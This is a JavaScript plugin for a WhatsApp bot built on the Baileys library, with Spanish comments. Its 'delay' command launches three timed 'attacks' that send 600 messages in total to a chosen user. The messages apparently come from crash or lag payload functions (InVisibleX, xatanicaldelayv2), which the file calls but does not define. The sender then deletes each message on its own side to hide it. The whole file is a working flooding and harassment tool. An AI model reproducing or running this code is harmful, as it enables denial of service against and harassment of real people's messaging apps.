import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn }) => {
  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
  if (jid === conn.user.id) {
    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m });
  }

  // 🚀 Ataque 1
  conn.sendMessage(m.chat, { text: '🚀 Ataque 1 iniciado (0:00). Duración: 5 minutos.' }, { quoted: m });
  for (let round = 0; round < 10; round++) {
    setTimeout(() => {
      enviarTanda(conn, jid, round + 1, m, '1');
    }, round * 30000);
  }

  // ⏳ Ataque 2 (después de 10 minutos)
  setTimeout(() => {
    conn.sendMessage(m.chat, { text: '🚀 Ataque 2 iniciado (10:00). Duración: 5 minutos.' }, { quoted: m });
    for (let round = 0; round < 10; round++) {
      setTimeout(() => {
        enviarTanda(conn, jid, round + 1, m, '2');
      }, round * 30000);
    }
  }, 600000); // 10 min

  // ⏳ Ataque 3 (después de 20 minutos)
  setTimeout(() => {
    conn.sendMessage(m.chat, { text: '🚀 Ataque 3 iniciado (20:00). Duración: 5 minutos.' }, { quoted: m });
    for (let round = 0; round < 10; round++) {
      setTimeout(() => {
        enviarTanda(conn, jid, round + 1, m, '3');
      }, round * 30000);
    }

    // ✅ Al terminar el ataque 3 (5 min después = 25:00)
    setTimeout(() => {
      conn.sendMessage(m.chat, {
        text: '🎯 Ataque finalizado. 600 mensajes enviados en total.',
      }, { quoted: m });
    }, 300000); // Espera 5 minutos más tras inicio del ataque 3

  }, 1200000); // 20 min
};

handler.command = /^delay$/i;
export default handler;

async function enviarTanda(conn, jid, num, m, ciclo) {
  try {
    for (let i = 0; i < 20; i++) {
      const m1 = await InVisibleX(conn, jid, true);
      const m2 = await xatanicaldelayv2(conn, jid, true);

      await conn.sendMessage(conn.user.id, { delete: m1.key });
      await conn.sendMessage(conn.user.id, { delete: m2.key });

      await delay(1000); // 1s entre mensajes
    }

    await conn.sendMessage(m.chat, {
      text: `✅ Tanda ${num}/10 del ataque ${ciclo} enviada.`,
    }, { quoted: m });

  } catch (e) {
    console.error("❌ Error en tanda:", e);
    await conn.sendMessage(m.chat, {
      text: "❌ Error en tanda:\n" + e.message,
    }, { quoted: m });
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}